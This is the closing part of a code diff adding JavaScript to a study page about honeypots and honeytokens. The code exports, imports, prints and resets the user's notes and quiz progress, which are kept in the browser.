+function download(name,text,type){const a=document.createElement("a");a.href=URL.createObjectURL(new Blob([text],{type}));a.download=name;document.body.appendChild(a);a.click();setTimeout(()=>{URL.revokeObjectURL(a.href);a.remove();},500);}
+$("#exportBtn").onclick=()=>{
+  let md=`# My notes — Honeypots & Honeytokens\n\n_Exported ${new Date().toLocaleString()}_\n\n`;
+  const qd=Object.keys(state.quiz).length,qr=$$(".quiz[data-id]").filter(q=>state.quiz[q.dataset.id]===+q.dataset.answer).length;
+  md+=`Sections understood: ${sections.filter(s=>state.done[s.id]).length}/${sections.length} · Check questions correct: ${qr}/${qd} answered`+(state.finalScore!==undefined?` · Final quiz: ${state.finalScore}/${FQ.length}`:"")+"\n\n";
+  sections.forEach(s=>{md+=`## ${s.dataset.title} ${state.done[s.id]?"✓":""}\n\n${(state.notes[s.id]||"_(no notes)_").trim()}\n\n`;});
+  md+=`\n<!-- honeypot-notes-data ${JSON.stringify(state)} -->\n`;
+  download("honeypot-notes.md",md,"text/markdown");
+};
+$("#importBtn").onclick=()=>$("#importFile").click();
+$("#importFile").onchange=e=>{const f=e.target.files[0];if(!f)return;const r=new FileReader();r.onload=()=>{try{let txt=r.result,m=txt.match(/<!-- honeypot-notes-data (\{[\s\S]*\}) -->/);const data=JSON.parse(m?m[1]:txt);state=Object.assign({notes:{},done:{},quiz:{},final:{}},data);save();location.reload();}catch(err){alert("Could not read this file. Please choose a notes file exported from this page.");}};r.readAsText(f);e.target.value="";};
+$("#printBtn").onclick=()=>{$$(".mynotes").forEach(d=>{if($("textarea",d).value.trim())d.open=true;});$$(".reveal").forEach(x=>x.classList.add("in"));window.print();};
+$("#resetBtn").onclick=()=>{if(confirm("Delete all your notes, ticks and quiz answers in this browser? (Export first if you want to keep them.)")){state={notes:{},done:{},quiz:{},final:{}};save();location.reload();}};
+})();
+</script>
+</body>
+</html>
